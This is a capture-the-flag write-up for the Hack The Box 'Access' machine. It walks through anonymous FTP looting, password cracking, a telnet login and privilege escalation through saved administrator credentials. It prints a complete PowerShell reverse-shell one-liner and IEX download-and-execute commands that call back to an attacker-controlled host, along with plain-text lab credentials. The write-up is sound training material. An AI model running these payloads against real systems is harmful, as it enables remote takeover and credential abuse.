# Nmap  
```bash  
Nmap scan report for 10.129.151.93  
Host is up (0.074s latency).  
  
PORT   STATE SERVICE VERSION  
21/tcp open  ftp     Microsoft ftpd  
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  
|_Cant get directory listing: PASV failed: 425 Cannot open data connection.  
| ftp-syst:  
|_  SYST: Windows_NT  
23/tcp open  telnet?  
80/tcp open  http    Microsoft IIS httpd 7.5  
| http-methods:  
|_  Potentially risky methods: TRACE  
|_http-title: MegaCorp  
|_http-server-header: Microsoft-IIS/7.5  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Device type: general purpose|phone|specialized  
Running (JUST GUESSING): Microsoft Windows 8|Phone|7|2008|8.1|Vista (92%)  
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1  
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (89%)  
No exact OS matches for host (test conditions non-ideal).  
Network Distance: 2 hops  
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows  
  
TRACEROUTE (using port 23/tcp)  
HOP RTT      ADDRESS  
1   85.82 ms 10.10.16.1  
2   85.97 ms 10.129.151.93  
  
OS and Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .  
Nmap done: 1 IP address (1 host up) scanned in 189.64 seconds  
```  
# Explotation  
In port 23 we see a "Microsoft Telnet Service" and it prompts for login credentials  
  
In ftp with anonymous session we found two files:  
- Access Control.zip . Password protected, no crackable with john  
- backup.mdb . With mdb-tables and mdb-export we can see tables and export them:  
	admin:admin  
	engineer:access4u@security  
	backup_admin:admin  
  
With that credentials we create a wordlist and we crack the zip hash with john: (access4u@security is the password for the zip file)  
```bash  
┌──(kali㉿kali)-[~/…/CTFs/Hackthebox/Access/Access-Control]  
└─$ john --wordlist=posible-passwords hash.txt  
Using default input encoding: UTF-8  
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])  
Cost 1 (HMAC size) is 10650 for all loaded hashes  
Will run 4 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
Warning: Only 5 candidates left, minimum 32 needed for performance.  
access4u@security (Access Control.zip/Access Control.pst)      
1g 0:00:00:00 DONE (2024-12-01 20:31) 7.142g/s 35.71p/s 35.71c/s 35.71C/s admin..admin  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed.  
```  
  
Opening the .pst file that we found inside the zip file, we found some credentials: (Open it with **[this]([https://goldfynch.com/pst-viewer/)**](https://goldfynch.com/pst-viewer/)**))  
- security:4Cc3ssC0ntr0ller  
  
With that credentials we get a shell through telnet:  
```bash  
┌──(kali㉿kali)-[~/…/CTFs/Hackthebox/Access/Access-Control]  
└─$ telnet 10.129.151.93 23  
Trying 10.129.151.93...  
Connected to 10.129.151.93.  
Escape character is '^]'.  
Welcome to Microsoft Telnet Service  
  
login: security  
password: 4Cc3ssC0ntr0ller  
  
*===============================================================  
Microsoft Telnet Server.  
*===============================================================  
C:\Users\security>whoami  
access\security  
```  
  
As is a limited shell, we improve our shell using a ps1 file with our powershell payload, and downloaded and executed using the following method:  
```bash  
Invoke-PowerShellTcpOneLine.ps1  
  
#A simple and small reverse shell. Options and help removed to save space.  
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.  
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.24',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()  
```  
Open a python3 http server (port 80) and execute the following command:  
`powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.16.24/Invoke-PowerShellTcpOneLine.ps1')`
  
# Privilege escalation  
Now to escalate privileges we found in Public desktop a link file which executes with runas.exe the binary C:\ZKTeco\ZKAccess3.5\Access.exe with stored credentials. If we execute `cmdkey /list` we see that we have administrator credentials stored, so we can abuse it:  
`C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.16.24/Invoke-PowerShellTcpOneLine.ps1')"`  
  
And with a netcat listener we get a shell as administrator